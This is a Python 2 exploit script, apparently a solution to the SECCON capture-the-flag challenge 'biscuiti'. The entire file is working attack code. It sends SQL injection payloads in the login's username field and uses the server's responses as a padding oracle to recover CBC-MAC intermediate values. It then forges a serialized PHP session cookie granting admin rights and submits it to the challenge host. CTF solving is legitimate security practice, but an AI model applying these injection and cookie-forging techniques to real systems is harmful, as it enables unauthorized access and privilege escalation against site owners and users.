import requests
import re
from base64 import b64decode as decode
from base64 import b64encode as encode
import urllib

URL = "http://biscuiti.pwn.seccon.jp/"

# XOR 2 string
def xor(a, b):
    res = ""
    for i in range(16):
        res += chr(ord(a[i]) ^ ord(b[i]))

    return res

# padding oracle
def oracle(payload):
    data = {"username": "admin' and 1=2 union select 'admin', '" + encode(payload) + "' -- asd", "password": ""}
    r = requests.post(URL, data=data)
    m = re.search(r"Hello", r.content)
    return not m

# use padding oracle for decrypt block
def decrypt(enc):
    imd = ""
    for i in range(len(imd), 16):
        iv = ""
        for im in imd:
            iv += chr((i+1)^ord(im))

        iv = iv[::-1]

        for j in range(256):
            ivt = chr(j) + iv
            ivt = "\00"*16 + "\00"*(16-len(ivt)) + ivt
            if oracle(ivt + enc):
                imd += chr(j^(i+1))
                res = "\x00"*(16 - len(imd)) + imd[::-1]
                break

    return imd[::-1]

# payload for craft new session with concat old sessions
payloads = ['aaaaaaaaaadddddddddddddddd";s:7:"isadmin";b:1;}', 'aaaaaaaaaadddddddddddddddd']
# dummy block for manage mac
dummy = "dddddddddddddddd"

imds = []
macs = []

for payload in payloads:
    print "Get session with username " + repr(payload)
    data = {"username": "admin' and 1=2 union select '" + payload + "', 'Z2dleg==' -- asd", "password": ""}
    r = requests.post(URL, data=data)
    sess = decode(urllib.unquote(r.cookies["JSESSION"]))

    mac = sess[-16:]
    macs.append(mac)
    plain = sess[:-16]
    pad = 16 - (len(plain)%16)

    plain = plain + (chr(pad) * pad)

    for i in range(len(plain), 0, -16):
        p = plain[i-16:i]
        print "Decrypt block [ " + mac.encode("hex") + " ] from plain " + repr(p)
        imd = decrypt(mac)
        mac = xor(imd, p)

        if p == dummy:
            print "[+] got imd of dummy block [ " + imd.encode("hex") + " ]"
            print
            imds.append(imd)
            break

print "Concat block with patch the dummy block"
before = xor(imds[1], dummy)
shouldbe = imds[0]
patch = xor(before, shouldbe)
sess = encode('a:2:{s:4:"name";s:26:"aaaaaaaaaa' + patch + '";s:7:"isadmin";b:1;}";s:7:"isadmin";N;}' + macs[0])
r = requests.get(URL, cookies={'JSESSION': sess})
print r.content
